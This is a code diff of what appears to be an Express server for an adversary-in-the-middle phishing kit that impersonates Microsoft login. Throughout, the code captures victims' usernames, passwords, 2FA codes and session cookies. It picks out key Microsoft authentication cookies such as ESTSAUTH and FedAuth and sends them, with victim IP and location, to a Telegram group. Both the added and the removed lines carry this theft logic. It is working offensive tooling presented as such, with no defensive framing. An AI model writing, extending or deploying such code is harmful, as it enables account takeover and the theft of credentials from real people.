+      `━━━━━━━━━━━━━━━━━━\n` +
+      `*Victim Information:*\n` +
+      `*IP:* \`${victimInfo.ip}\`\n` +
+      `*Location:* ${victimInfo.location}\n` +
+      `*Browser:* ${victimInfo.browser}\n` +
+      `*OS:* ${victimInfo.os}\n` +
+      `*Time:* ${victimInfo.timestamp}\n\n` +
+      `*Cookies:*\n${cookiesText}`;
+    
+    await bot.sendMessage(telegramGroupId, message, { parse_mode: 'Markdown' })
+      .catch(() => {});
   }
+  
+  res.redirect(302, redirect);
 });
 
-
-// Serve the Microsoft phishing page
-app.get('/microsoft', (req, res) => {
-  res.sendFile(path.join(__dirname, 'public', 'microsoft-login.html'));
-});
-
-// Debug endpoint
-app.get('/proxy-debug', (req, res) => {
-  res.json({
-    status: 'Proxy configured',
-    target: MICROSOFT_LOGIN_URL,
-    sessions: capturedSessions.size,
-    timestamp: new Date().toISOString()
+// ============= HEALTH CHECK ENDPOINT FOR RENDER =============
+app.get('/health', (req, res) => {
+  res.json({ 
+    status: 'ok', 
+    timestamp: Date.now(),
+    uptime: process.uptime(),
+    activeSessions: activeSessions.size,
+    capturedSessions: capturedData.size
   });
 });
 
-// View captured sessions
+// ============= DEBUG ENDPOINTS =============
 app.get('/captured-sessions', (req, res) => {
-  const sessions = Array.from(capturedSessions.entries()).map(([id, data]) => ({
+  const sessions = Array.from(capturedData.entries()).map(([id, data]) => ({
     id,
     username: data.credentials?.username,
     hasPassword: !!data.credentials?.password,
-    has2FA: !!data.credentials?.totp,
-    cookieCount: data.cookies?.length,
-    stepCount: data.steps?.length,
-    time: new Date(data.startTime).toLocaleString()
+    cookieCount: data.cookies?.length || 0,
+    criticalCookies: data.cookies?.filter(c => 
+      c.includes('FedAuth') || 
+      c.includes('x-ms-gateway-token') || 
+      c.includes('ESTSAUTH') || 
+      c.includes('ESTSAUTHPERSISTENT') || 
+      c.includes('MSISAuth') || 
+      c.includes('SignInStateCookie')
+    ).length || 0,
+    victimInfo: data.credentials?.victimInfo || data.victimInfo,
+    time: data.credentials?.time
   }));
-  
-  res.json({
-    total: capturedSessions.size,
-    sessions
-  });
+  res.json({ total: capturedData.size, sessions });
 });
 
-// View specific captured session
-app.get('/captured-sessions/:sessionId', (req, res) => {
-  const session = capturedSessions.get(req.params.sessionId);
-  if (!session) {
-    return res.status(404).json({ error: 'Session not found' });
-  }
-  res.json(session);
-});
-
-// Telegram alert helper functions
-async function sendCredentialAlert(sessionId, session) {
-  if (!bot || !telegramGroupId) return;
-  
-  const message = 
-    `🔑 *Credentials Captured!*\n` +
-    `━━━━━━━━━━━━━━━━━━\n` +
-    `*Session:* \`${sessionId}\`\n` +
-    `*Username:* \`${session.credentials?.username || 'N/A'}\`\n` +
-    `*Password:* \`${session.credentials?.password || 'N/A'}\`\n` +
-    `*IP:* \`${session.ip || 'Unknown'}\`\n` +
-    `*Time:* ${new Date().toLocaleString()}`;
-  
-  try {
-    await bot.sendMessage(telegramGroupId, message, { parse_mode: 'Markdown' });
-    console.log(`✅ Credential alert sent for ${sessionId}`);
-  } catch (err) {
-    console.error('❌ Telegram error:', err.message);
-  }
-}
-
-async function sendTwoFactorAlert(sessionId, session, code) {
-  if (!bot || !telegramGroupId) return;
-  
-  const message = 
-    `🔢 *2FA Code Captured!*\n` +
-    `━━━━━━━━━━━━━━━━━━\n` +
-    `*Session:* \`${sessionId}\`\n` +
-    `*Username:* \`${session.credentials?.username || 'N/A'}\`\n` +
-    `*2FA Code:* \`${code}\`\n` +
-    `*Time:* ${new Date().toLocaleString()}`;
-  
-  try {
-    await bot.sendMessage(telegramGroupId, message, { parse_mode: 'Markdown' });
-  } catch (err) {
-    console.error('❌ Telegram error:', err.message);
-  }
-}
-
-async function sendCookieAlert(sessionId, session, cookies) {
-  if (!bot || !telegramGroupId) return;
-  
-  const cookieText = cookies.map(c => {
-    const match = c.match(/([^=]+)=([^;]+)/);
-    if (match) {
-      return `• *${match[1]}*: \`${match[2].substring(0, 30)}...\``;
-    }
-    return `• \`${c.substring(0, 50)}...\``;
-  }).join('\n');
-  
-  const message = 
-    `🍪 *SESSION COOKIES CAPTURED!*\n` +
-    `━━━━━━━━━━━━━━━━━━\n` +
-    `*Session:* \`${sessionId}\`\n` +
-    `*Username:* \`${session.credentials?.username || 'N/A'}\`\n` +
-    `*Cookies:*\n${cookieText}\n\n` +
-    `*Time:* ${new Date().toLocaleString()}`;
-  
-  try {
-    await bot.sendMessage(telegramGroupId, message, { parse_mode: 'Markdown' });
-    console.log(`🔥 Cookie alert sent for ${sessionId}`);
-  } catch (err) {
-    console.error('❌ Telegram error:', err.message);
-  }
-}
-
-// ============= TEST ENDPOINTS =============
 app.get('/test', (req, res) => {
   res.json({ 
     status: 'ok', 
-    message: 'Server is running',
-    timestamp: new Date().toISOString(),
     activeSessions: activeSessions.size,
-    capturedSessions: capturedSessions.size,
-    sessionTimeoutMinutes: SESSION_TIMEOUT / 60000,
-    codeExpirationMinutes: CODE_EXPIRATION_TIME / 60000
+    capturedSessions: capturedData.size
   });
 });
 
-app.get('/sessions', (req, res) => {
-  for (const [sessionId, session] of activeSessions.entries()) {
-    cleanupStaleSockets(session);
+// ============= ERROR HANDLING =============
+app.use((req, res) => {
+  if (req.path.startsWith('/api/') || req.path.startsWith('/proxy/')) {
+    return res.status(404).json({ error: 'Endpoint not found' });
   }
-  
-  const sessionsInfo = Array.from(activeSessions.entries()).map(([sessionId, session]) => ({
-    sessionId,
-    email: session.email,
-    stage: session.stage,
-    createdAt: new Date(session.createdAt).toLocaleString(),
-    lastActivity: new Date(session.lastActivity).toLocaleString(),
-    ageMinutes: Math.round((Date.now() - session.createdAt) / 60000),
-    inactivityMinutes: Math.round((Date.now() - session.lastActivity) / 60000),
-    socketCount: session.sockets.size
-  }));
-  
-  res.json({
-    totalSessions: activeSessions.size,
-    sessions: sessionsInfo
-  });
-});
-
-app.get('/health', (req, res) => {
-  res.json({
-    status: 'ok',
-    activeSessions: activeSessions.size,
-    capturedSessions: capturedSessions.size,
-    uptime: process.uptime(),
-    sessionTimeout: `${SESSION_TIMEOUT / 60000} minutes`,
-    codeExpiration: `${CODE_EXPIRATION_TIME / 60000} minutes`
-  });
-});
-
-// This should be last - catch-all route
-app.get(/.*/, (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'index.html'));
+});
+
+app.use((err, req, res, next) => {
+  console.error('Server error:', err);
+  res.status(500).json({ error: 'Internal server error' });
 });
 
 // ============= START SERVER =============
 const PORT = process.env.PORT || 3001;
-server.listen(PORT, () => {
+server.listen(PORT, '0.0.0.0', () => {
   console.log(`🚀 Server running on port ${PORT}`);
-  console.log(`📁 Serving static files from: ${path.join(__dirname, 'public')}`);
-  console.log(`🔗 Test endpoint: http://localhost:${PORT}/test`);
-  console.log(`📊 Sessions endpoint: http://localhost:${PORT}/sessions`);
-  console.log(`❤️ Health endpoint: http://localhost:${PORT}/health`);
-  console.log(`🎯 Microsoft phishing page: http://localhost:${PORT}/microsoft`);
-  console.log(`🔍 Proxy debug: http://localhost:${PORT}/proxy-debug`);
+  console.log(`🎯 Microsoft page: http://localhost:${PORT}/microsoft`);
   console.log(`🍪 Captured sessions: http://localhost:${PORT}/captured-sessions`);
+  console.log(`❤️ Health check: http://localhost:${PORT}/health`);
 });
